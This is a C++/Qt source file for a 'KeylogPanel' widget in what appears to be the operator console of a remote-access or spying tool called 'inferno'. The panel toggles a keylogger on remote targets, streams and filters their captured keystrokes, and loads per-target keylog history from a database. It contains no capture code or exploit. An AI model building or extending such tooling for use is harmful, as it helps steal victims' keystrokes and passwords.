#include "../../../include/ui/components/KeylogPanel.hpp"
#include "../../../include/ui/StyleSheets.hpp"
#include "../../../include/database/Inferno_Database.hpp"
#include <QVBoxLayout>
#include <QHBoxLayout>
#include <QLabel>
#include <QIcon>

namespace inferno {

KeylogPanel::KeylogPanel(QWidget* parent)
    : QWidget(parent) {
    setupUI();
}

void KeylogPanel::setupUI() {
    auto* layout = new QVBoxLayout(this);
    layout->setContentsMargins(0, 0, 0, 0);

    auto* header = new QHBoxLayout();
    header->addWidget(new QLabel("KEYSTROKE STREAM"));
    header->addStretch();
    
    m_btnKeylog = new QPushButton();
    m_btnKeylog->setObjectName("iconButton");
    m_btnKeylog->setFixedSize(40, 40);
    m_btnKeylog->setIcon(QIcon(":/icon_eye_closed.png"));
    m_btnKeylog->setIconSize(QSize(32, 32));
    m_btnKeylog->setCheckable(true);
    m_btnKeylog->setToolTip("Toggle Keylogger");
    connect(m_btnKeylog, &QPushButton::toggled, this, [this](bool checked) {
        m_btnKeylog->setIcon(QIcon(checked ? ":/icon_eye_open.png" : ":/icon_eye_closed.png"));
    });
    connect(m_btnKeylog, &QPushButton::toggled, this, &KeylogPanel::keylogToggled);
    
    header->addWidget(m_btnKeylog);
    layout->addLayout(header);

    // Keylog Search & History Toolbar
    auto* toolLayout = new QHBoxLayout();
    m_searchBox = new QLineEdit();
    m_searchBox->setPlaceholderText("Filter keystrokes...");
    m_searchBox->setStyleSheet(ui::style::INPUT_BOX);
    connect(m_searchBox, &QLineEdit::textChanged, this, &KeylogPanel::filterKeylogStream);

    auto* btnKeylogHistory = new QPushButton();
    btnKeylogHistory->setObjectName("iconButton");
    btnKeylogHistory->setFixedSize(40, 40);
    btnKeylogHistory->setIcon(QIcon(":/icon_history.png"));
    btnKeylogHistory->setIconSize(QSize(32, 32));
    btnKeylogHistory->setToolTip("Load Keylog History");
    connect(btnKeylogHistory, &QPushButton::clicked, this, [this](){
        if (!m_activeUuid.isEmpty()) loadHistory(m_activeUuid);
    });

    toolLayout->addWidget(m_searchBox);
    toolLayout->addWidget(btnKeylogHistory);
    layout->addLayout(toolLayout);

    m_keylogStream = new QPlainTextEdit();
    m_keylogStream->setReadOnly(true);
    layout->addWidget(m_keylogStream);
}

void KeylogPanel::setKeylogButtonChecked(bool checked) {
    m_btnKeylog->blockSignals(true);
    m_btnKeylog->setChecked(checked);
    m_btnKeylog->setIcon(QIcon(checked ? ":/icon_eye_open.png" : ":/icon_eye_closed.png"));
    m_btnKeylog->blockSignals(false);
}

void KeylogPanel::setKeylogButtonEnabled(bool enabled) {
    m_btnKeylog->setEnabled(enabled);
}

void KeylogPanel::appendText(const QString& text) {
    m_history.append(text);
    constexpr int kMaxHistoryLines = 50000;
    if (m_history.size() > kMaxHistoryLines) {
        m_history.removeFirst();
    }
    if (m_searchBox->text().isEmpty() || text.contains(m_searchBox->text(), Qt::CaseInsensitive)) {
        m_keylogStream->appendPlainText(text);
    }
}

void KeylogPanel::loadHistory(const QString& uuid) {
    m_activeUuid = uuid;
    m_keylogStream->clear();
    QString filter = m_searchBox->text();
    
    QStringList dbHistory = Inferno_Database::instance().getKeylogHistory(uuid);
    for (const QString& line : dbHistory) {
        if (filter.isEmpty() || line.contains(filter, Qt::CaseInsensitive)) {
            m_keylogStream->appendPlainText(line);
        }
    }
    m_keylogStream->appendPlainText("[SYSTEM] Keylog database history dump complete.");
    emit statusMessage("Keylog history reloaded from SQL");
}

void KeylogPanel::filterKeylogStream(const QString& text) {
    m_keylogStream->clear();
    for (const QString& line : m_history) {
        if (text.isEmpty() || line.contains(text, Qt::CaseInsensitive)) {
            m_keylogStream->appendPlainText(line);
        }
    }
}

} // namespace inferno
